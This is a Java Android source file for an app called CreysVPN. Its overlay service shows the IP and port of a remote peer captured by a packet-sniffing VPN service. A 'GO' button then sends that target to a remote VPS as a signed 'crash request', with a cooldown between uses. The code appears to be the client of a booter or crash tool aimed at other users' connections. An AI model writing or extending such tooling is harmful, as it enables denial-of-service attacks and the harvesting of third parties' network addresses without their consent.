package com.creysvpn.app;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

/**
 * 🎨 OVERLAY SERVICE - ИСПОЛЬЗУЕТ ВСЕ ТВОИ LAYOUT ФАЙЛЫ!
 */
public class OverlayService extends Service {

    private static final String TAG = "OverlayService";
    private static final String PREFS_NAME = "creysvpn_prefs";
    private static final String KEY_COOLDOWN_TIME = "cooldown_time";

    private WindowManager windowManager;

    // ✅ ТВОИ LAYOUT ЭЛЕМЕНТЫ:
    private View overlayRoot;           // overlay_layout.xml - кнопка GO
    private TextView tvOverlayText;     // Текст на кнопке

    private View overlayIpView;         // overlay_ip.xml - окошко с IP:портом
    private TextView tvOverlayIP;       // Текст IP:порт

    private View overlayBanner;         // overlay_banner.xml - водяной знак CreysVPN

    private View overlayNotification;   // overlay_notification.xml - уведомление
    private TextView tvNotification;    // Текст уведомления

    private View overlayStatus;         // overlay_status.xml - статус отправки
    private TextView tvStatusText;      // Текст статуса

    private View overlayTimer;          // overlay_timer.xml - таймер cooldown
    private TextView tvTimer;           // Текст таймера

    // Данные
    private String latestIp = null;
    private int latestPort = 0;
    private boolean isButtonEnabled = true;
    private long cooldownEndTime = 0;

    private Handler handler = new Handler(Looper.getMainLooper());
    private SharedPreferences prefs;

    /**
     * 📡 BROADCAST RECEIVER
     */
    private final BroadcastReceiver ipFoundReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (PcapVpnService.ACTION_IP_FOUND.equals(intent.getAction())) {
                String ipData = intent.getStringExtra(PcapVpnService.EXTRA_IP_DATA);

                if (ipData != null && ipData.contains(":")) {
                    String[] parts = ipData.split(":");
                    if (parts.length == 2) {
                        latestIp = parts[0];
                        latestPort = Integer.parseInt(parts[1]);

                        Log.i(TAG, "📡 Received: " + latestIp + ":" + latestPort);

                        // Показываем IP:порт в твоём окошке
                        showIpPort(latestIp + ":" + latestPort);

                        // Анимация кнопки
                        animateButton();
                    }
                }
            }
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        cooldownEndTime = prefs.getLong(KEY_COOLDOWN_TIME, 0);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        // Создаём все твои overlay элементы
        createOverlayButton();      // Кнопка GO
        createOverlayIp();          // Окошко с IP:портом
        createOverlayBanner();      // Водяной знак CreysVPN
        createOverlayNotification(); // Уведомления
        createOverlayStatus();      // Статус отправки
        createOverlayTimer();       // Таймер cooldown

        // 📡 РЕГИСТРИРУЕМ BROADCAST
        IntentFilter filter = new IntentFilter(PcapVpnService.ACTION_IP_FOUND);
        registerReceiver(ipFoundReceiver, filter);

        checkCooldown();
        Log.i(TAG, "✅ OverlayService started");
    }

    /**
     * 🔘 СОЗДАНИЕ КНОПКИ GO (overlay_layout.xml)
     */
    private void createOverlayButton() {
        overlayRoot = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null);
        tvOverlayText = overlayRoot.findViewById(R.id.tvOverlayText);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.END;
        params.x = 50;
        params.y = 300;

        windowManager.addView(overlayRoot, params);

        overlayRoot.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                onButtonClicked();
            }
        });

        updateButtonState();
    }

    /**
     * 📍 СОЗДАНИЕ ОКОШКА IP:ПОРТ (overlay_ip.xml)
     */
    private void createOverlayIp() {
        overlayIpView = LayoutInflater.from(this).inflate(R.layout.overlay_ip, null);
        tvOverlayIP = overlayIpView.findViewById(R.id.tvOverlayIP);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.END;
        params.x = 50;
        params.y = 200;  // Над кнопкой GO

        windowManager.addView(overlayIpView, params);
        overlayIpView.setVisibility(View.GONE);  // Скрыто по умолчанию
    }

    /**
     * 💧 СОЗДАНИЕ ВОДЯНОГО ЗНАКА (overlay_banner.xml)
     */
    private void createOverlayBanner() {
        overlayBanner = LayoutInflater.from(this).inflate(R.layout.overlay_banner, null);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
        params.y = 50;

        windowManager.addView(overlayBanner, params);
    }

    /**
     * 🔔 СОЗДАНИЕ УВЕДОМЛЕНИЙ (overlay_notification.xml)
     */
    private void createOverlayNotification() {
        overlayNotification = LayoutInflater.from(this).inflate(R.layout.overlay_notification, null);
        tvNotification = overlayNotification.findViewById(R.id.tvNotification);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.CENTER;

        windowManager.addView(overlayNotification, params);
        overlayNotification.setVisibility(View.GONE);
    }

    /**
     * 📊 СОЗДАНИЕ СТАТУСА (overlay_status.xml)
     */
    private void createOverlayStatus() {
        overlayStatus = LayoutInflater.from(this).inflate(R.layout.overlay_status, null);
        tvStatusText = overlayStatus.findViewById(R.id.tvStatusText);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.CENTER_HORIZONTAL | Gravity.BOTTOM;
        params.y = 200;

        windowManager.addView(overlayStatus, params);
        overlayStatus.setVisibility(View.GONE);
    }

    /**
     * ⏱️ СОЗДАНИЕ ТАЙМЕРА (overlay_timer.xml)
     */
    private void createOverlayTimer() {
        overlayTimer = LayoutInflater.from(this).inflate(R.layout.overlay_timer, null);
        tvTimer = overlayTimer.findViewById(R.id.tvTimer);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT
        );

        params.gravity = Gravity.TOP | Gravity.END;
        params.x = 50;
        params.y = 400;  // Под кнопкой GO

        windowManager.addView(overlayTimer, params);
        overlayTimer.setVisibility(View.GONE);
    }

    /**
     * 🖱️ ОБРАБОТКА КЛИКА НА КНОПКУ GO
     */
    private void onButtonClicked() {
        if (!isButtonEnabled) {
            long remaining = (cooldownEndTime - System.currentTimeMillis()) / 1000;
            if (remaining > 0) {
                long minutes = remaining / 60;
                long seconds = remaining % 60;
                showNotification(String.format("Жди %d:%02d", minutes, seconds));
            }
            return;
        }

        if (latestIp == null || latestPort == 0) {
            showNotification("IP не найден!");
            return;
        }

        sendCrashRequest(latestIp, latestPort);
    }

    /**
     * 📡 ОТПРАВКА HTTP ЗАПРОСА
     */
    private void sendCrashRequest(final String ip, final int port) {
        showNotification("Send...");
        overlayRoot.setEnabled(false);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String deviceId = DeviceIdGenerator.getDeviceId(OverlayService.this);
                    long timestamp = System.currentTimeMillis() / 1000;
                    String dataToSign = deviceId + ip + port + timestamp;
                    String signature = generateHmacSignature(dataToSign);

                    String jsonPayload = String.format(
                            "{\"device_id\":\"%s\",\"ip\":\"%s\",\"port\":%d,\"timestamp\":%d,\"signature\":\"%s\",\"version\":\"%s\"}",
                            deviceId, ip, port, timestamp, signature, Config.APP_VERSION
                    );

                    Log.i(TAG, "📤 Sending: " + jsonPayload);

                    URL url = new URL(Config.VPS_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonPayload.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    final boolean success = (responseCode >= 200 && responseCode < 300);

                    Log.i(TAG, "📥 Response: " + responseCode);

                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            if (success) {
                                showNotification("Успешно!");
                                startCooldown();
                            } else {
                                showNotification("Ошибка отправки!");
                                overlayRoot.setEnabled(true);
                            }
                        }
                    });

                } catch (final Exception e) {
                    Log.e(TAG, "❌ Error: " + e.getMessage(), e);

                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            showNotification("Ошибка отправки!");
                            overlayRoot.setEnabled(true);
                        }
                    });
                }
            }
        }).start();
    }

    /**
     * 🔐 HMAC-SHA256
     */
    private String generateHmacSignature(String data) {
        try {
            String secretKey = Config.getSecretKey();

            Mac mac = Mac.getInstance("HmacSHA256");
            SecretKeySpec secretKeySpec = new SecretKeySpec(
                    secretKey.getBytes(StandardCharsets.UTF_8),
                    "HmacSHA256"
            );
            mac.init(secretKeySpec);

            byte[] hash = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));

            StringBuilder hexString = new StringBuilder();
            for (byte b : hash) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            return hexString.toString();

        } catch (Exception e) {
            Log.e(TAG, "Error HMAC: " + e.getMessage());
            return "";
        }
    }

    /**
     * ⏱️ COOLDOWN
     */
    private void startCooldown() {
        cooldownEndTime = System.currentTimeMillis() + Config.COOLDOWN_DURATION_MS;
        prefs.edit().putLong(KEY_COOLDOWN_TIME, cooldownEndTime).apply();

        isButtonEnabled = false;
        updateButtonState();

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                checkCooldown();
            }
        }, 1000);
    }

    private void checkCooldown() {
        long now = System.currentTimeMillis();

        if (now < cooldownEndTime) {
            isButtonEnabled = false;
            updateButtonState();

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    checkCooldown();
                }
            }, 1000);
        } else {
            isButtonEnabled = true;
            prefs.edit().remove(KEY_COOLDOWN_TIME).apply();
            updateButtonState();
        }
    }

    /**
     * 🔄 ОБНОВЛЕНИЕ СОСТОЯНИЯ КНОПКИ
     */
    private void updateButtonState() {
        if (overlayRoot == null) return;

        if (isButtonEnabled) {
            overlayRoot.setEnabled(true);
            overlayRoot.setAlpha(1.0f);
            hideTimer();
        } else {
            long remaining = (cooldownEndTime - System.currentTimeMillis()) / 1000;
            if (remaining > 0) {
                long minutes = remaining / 60;
                long seconds = remaining % 60;
                showTimer(String.format("%d:%02d", minutes, seconds));
            }
            overlayRoot.setEnabled(false);
            overlayRoot.setAlpha(0.5f);
        }
    }

    /**
     * 📍 ПОКАЗАТЬ IP:ПОРТ
     */
    private void showIpPort(String ipPort) {
        if (tvOverlayIP != null) {
            tvOverlayIP.setText(ipPort);
            overlayIpView.setVisibility(View.VISIBLE);

            handler.removeCallbacks(hideIpRunnable);
            handler.postDelayed(hideIpRunnable, 8000);
        }
    }

    private final Runnable hideIpRunnable = new Runnable() {
        @Override
        public void run() {
            if (overlayIpView != null) {
                overlayIpView.setVisibility(View.GONE);
            }
        }
    };

    /**
     * 🔔 ПОКАЗАТЬ УВЕДОМЛЕНИЕ
     */
    private void showNotification(String text) {
        if (tvNotification != null) {
            tvNotification.setText(text);
            overlayNotification.setVisibility(View.VISIBLE);

            handler.removeCallbacks(hideNotificationRunnable);
            handler.postDelayed(hideNotificationRunnable, 3000);
        }
    }

    private final Runnable hideNotificationRunnable = new Runnable() {
        @Override
        public void run() {
            if (overlayNotification != null) {
                overlayNotification.setVisibility(View.GONE);
            }
        }
    };

    /**
     * 📊 ПОКАЗАТЬ СТАТУС
     */
    private void showStatus(String text) {
        if (tvStatusText != null) {
            tvStatusText.setText(text);
            overlayStatus.setVisibility(View.VISIBLE);
        }
    }

    private void hideStatus() {
        if (overlayStatus != null) {
            overlayStatus.setVisibility(View.GONE);
        }
    }

    /**
     * ⏱️ ПОКАЗАТЬ ТАЙМЕР
     */
    private void showTimer(String time) {
        if (tvTimer != null) {
            tvTimer.setText(time);
            overlayTimer.setVisibility(View.VISIBLE);
        }
    }

    private void hideTimer() {
        if (overlayTimer != null) {
            overlayTimer.setVisibility(View.GONE);
        }
    }

    /**
     * ✨ АНИМАЦИЯ КНОПКИ
     */
    private void animateButton() {
        if (overlayRoot != null) {
            overlayRoot.animate()
                    .scaleX(1.2f)
                    .scaleY(1.2f)
                    .setDuration(200)
                    .withEndAction(new Runnable() {
                        @Override
                        public void run() {
                            overlayRoot.animate()
                                    .scaleX(1.0f)
                                    .scaleY(1.0f)
                                    .setDuration(200)
                                    .start();
                        }
                    })
                    .start();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        try {
            unregisterReceiver(ipFoundReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Error unregister: " + e.getMessage());
        }

        handler.removeCallbacksAndMessages(null);

        // Удаляем все view
        if (windowManager != null) {
            try {
                if (overlayRoot != null) windowManager.removeView(overlayRoot);
                if (overlayIpView != null) windowManager.removeView(overlayIpView);
                if (overlayBanner != null) windowManager.removeView(overlayBanner);
                if (overlayNotification != null) windowManager.removeView(overlayNotification);
                if (overlayStatus != null) windowManager.removeView(overlayStatus);
                if (overlayTimer != null) windowManager.removeView(overlayTimer);
            } catch (Exception e) {
                Log.e(TAG, "Error removing views: " + e.getMessage());
            }
        }

        Log.i(TAG, "🛑 OverlayService stopped");
    }
}
